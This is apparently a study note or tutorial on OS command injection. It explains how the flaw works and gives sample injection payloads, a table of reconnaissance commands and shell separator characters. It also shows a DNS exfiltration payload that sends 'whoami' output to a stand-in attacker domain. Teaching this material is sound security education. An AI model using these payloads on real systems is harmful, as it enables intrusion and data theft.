
# Comman Injection

Command Injection and OS command Injection also known as shell injection is a web security vulnerability in which an attack can run arbitrary commands in a server Operating System. This will lead to a full compromise of the application and all its data. An attacker can use that system to compromise another computer in the infrastructure that is not accessible on the internet and pivot its way into the organization.


**Scenario**

Consider an application that let users see if something is in the inventory or not. That information is accessed via a URL like the following.

```
https://example.com/inventory?productID=45&section=42
```

To provide the inventory information, the application queries some legacy systems. For historical reasons, the functionality is implemented by calling out a shell command with the product and store IDs as arguments.

```
inventory.pl 45 42
```

This command outputs the inventory status for the specified item, which is returned to the user. Since the application implements no defenses against OS command injection, an attacker can submit the following input to execute an arbitrary command.

```
& echo OS_Command_Injection_success &
```

if this input is submitted in the productID parameter, then the command executed by the application is

```
inventory.pl & echo OS_Command_Injection_success & 42
```

The `echo` command simply causes the supplied string to be echoed in the output and is a useful way to test for some types of OS command injection. The `&` character is a shell command separator, and so what gets executed is three separate commands one after another. As a result, the output returned to the user is

```
Error - productID was not provided
OS_Command_Injection_success
42: command not found
```

The three lines of output demonstrate that:

- The original `inventory.pl` command was executed without its expected arguments, and so returned an error message.
- The injected `echo` command was executed, and the supplied string was echoed in the output.
- The original argument `42` was executed as a command, which caused an error.

Placing the additional command separator `&` after the injected command is generally useful because it separates the injected command from whatever follows the injection point. This reduces the likelihood that what follows will prevent the injected command from executing.

### Useful Commands

When you have identified an OS command injection vulnerability, it is generally useful to execute some initial commands to obtain information about the system that you have compromised. Below is a summary of some commands that are useful on Linux and Windows platforms

| Purpose of command | Linux | Windows |
| --- | --- | --- |
| Name of current user | `whoami` | `whoami` |
| Operating System | `uname -a` | `ver` |
| Network configuration | `ifconfig` | `ipconfig /all` |
| Network connections | `netstat -an` or `ss -tupln` | `netstat -an` |
| Running processes | `ps -ef` | tasklist |

### Blind OS command Injection vulnerabilities

Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.

Consider a website that lets users submit feedback about the site. The user enters their email address and a feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the `mail` program with the submitted details. For example

```bash
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

The output from the `mail` command (if any) is not returned in the application's responses, so using the `echo` payload would not be effective. In this situation, you can use a variety of other techniques to detect and exploit a vulnerability.

### Detecting blind OS command injection using time delays

You can use an injected command that will trigger a time delay, allowing you to confirm that the command was executed based on the time that the application takes to respond. The `ping` command is an effective way to do this, as it lets you specify the number of ICMP packets to send, and therefore the time taken for the command to run

```bash
& ping -c 10 127.0.0.1 &
```

This command will cause the application to ping its loopback network adapter for 10 seconds.

### Exploiting blind OS command injection by redirecting output

You can redirect the output from the injected command into a file within the web root that you can retrieve using the browser. For example, if the application serves static resources from the filesystem location `/var/www/static`, then you can submit the following input

```
& whoami > /var/www/static/whoami.txt &
```

The `>` character sends the output from the `whoami` command to the specified file. You can then use the browser to fetch `https://vulnerable-website.com/whoami.txt` to retrieve the file and view the output from the injected command.

### Exploiting blind OS command injection using out-of-band (OAST) techniques

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example

```
& nslookup kgji2ohoyw.web-attacker.com &
```

This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected.

The out-of-band channel also provides an easy way to exfiltrate the output from injected commands

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This will cause a DNS lookup to the attacker's domain containing the result of the `whoami` command

```
wwwuser.kgji2ohoyw.web-attacker.com
```

### Ways of injecting OS commands

A variety of shell metacharacters can be used to perform OS command injection attacks.

Several characters can be used as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems

```
&
&&
|
||
```

The following command separators work only on Unix-based systems

```
;
Newline 0x0a or \n
```

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command

```
`whomai`
```

```
$(whoami)
```

Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input you control appears within quotation marks in the original command. In this situation, you must terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command.
